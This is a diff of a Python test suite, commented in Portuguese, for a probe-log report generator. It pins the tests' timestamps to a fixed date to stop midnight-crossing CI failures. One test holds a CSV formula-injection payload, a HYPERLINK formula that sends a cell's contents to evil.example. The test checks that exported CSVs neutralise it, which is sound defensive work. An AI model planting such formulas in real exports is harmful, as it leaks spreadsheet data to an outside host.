@@ -344,7 +344,9 @@ class TestLogRobusto(Base):
 
 class TestRelatorioRobusto(Base):
     def gravar_falhas(self, corpo, n=6):
-        agora = datetime.now(core.UTC).replace(microsecond=0)
+        # meio-dia local de uma data fixa: com `datetime.now()` os 30 min de registros cruzavam a meia-noite se o teste
+        # rodasse entre 00:00 e 00:30 (o CI rodou às 00:15 UTC e a cobertura saiu com 2 dias)
+        agora = datetime(2026, 9, 21, 12, 0).astimezone()
         (self.pasta / "logs").mkdir(exist_ok=True)
         linhas = []
         for i in range(n):
@@ -364,8 +366,8 @@ class TestRelatorioRobusto(Base):
         return agora
 
     def test_csv_nao_carrega_formula_do_corpo_da_resposta(self):
-        self.gravar_falhas('=HYPERLINK("http://evil.example/?"&A1,"x")')
-        out = rel.gerar_relatorio(self.pasta, 1)
+        agora = self.gravar_falhas('=HYPERLINK("http://evil.example/?"&A1,"x")')
+        out = rel.gerar_relatorio(self.pasta, 1, agora=agora)
         celulas = []
         for arq in out.glob("*.csv"):
             for linha in arq.read_text(encoding="utf-8-sig").splitlines():
@@ -375,29 +377,29 @@ class TestRelatorioRobusto(Base):
 
     def test_cobertura_comeca_no_primeiro_registro(self):
         agora = self.gravar_falhas("x")
-        out = rel.gerar_relatorio(self.pasta, 7)
+        out = rel.gerar_relatorio(self.pasta, 7, agora=agora)
         linhas = (out / "4_cobertura_diaria.csv").read_text(encoding="utf-8-sig").splitlines()[1:]
         self.assertEqual(len(linhas), 1)  # não inventa "cobertura 0%" para os 6 dias em que a sonda não existia
         self.assertTrue(linhas[0].startswith(agora.astimezone().strftime("%d/%m/%Y")))
 
     def test_relatorio_avisa_quantas_linhas_do_log_estavam_ilegiveis(self):
-        self.gravar_falhas("x")
+        agora = self.gravar_falhas("x")
         arq = next((self.pasta / "logs").glob("sonda-*.jsonl"))
         with open(arq, "ab") as f:
             f.write(b"\xff\xfe nao e json\n")
-        html_ = (rel.gerar_relatorio(self.pasta, 1) / "resumo_para_chamado.html").read_text(encoding="utf-8")
+        html_ = (rel.gerar_relatorio(self.pasta, 1, agora=agora) / "resumo_para_chamado.html").read_text(encoding="utf-8")
         self.assertIn("1 linha(s) do log estavam ilegíveis", html_)
 
     def test_relatorio_e_publicado_por_inteiro_e_sem_sobras(self):
-        self.gravar_falhas("x")
-        out = rel.gerar_relatorio(self.pasta, 1)
+        agora = self.gravar_falhas("x")
+        out = rel.gerar_relatorio(self.pasta, 1, agora=agora)
         pai = out.parent
         self.assertEqual(sorted(p.name for p in pai.iterdir()), [out.name])  # sem .novo nem .velha
         self.assertEqual(len(list(out.iterdir())), 6)
 
     def test_pasta_do_dia_travada_gera_outra_completa_em_vez_de_misturar(self):
-        self.gravar_falhas("x")
-        primeiro = rel.gerar_relatorio(self.pasta, 1)
+        agora = self.gravar_falhas("x")
+        primeiro = rel.gerar_relatorio(self.pasta, 1, agora=agora)
         marca = primeiro / "3_ocorrencias.csv"
         antes = marca.read_bytes()
         original = os.replace
@@ -408,7 +410,7 @@ class TestRelatorioRobusto(Base):
             return original(src, dst)
         os.replace = travada
         try:
-            segundo = rel.gerar_relatorio(self.pasta, 1)
+            segundo = rel.gerar_relatorio(self.pasta, 1, agora=agora)
         finally:
             os.replace = original
         self.assertNotEqual(segundo, primeiro)  # fica numa pasta com a hora no nome
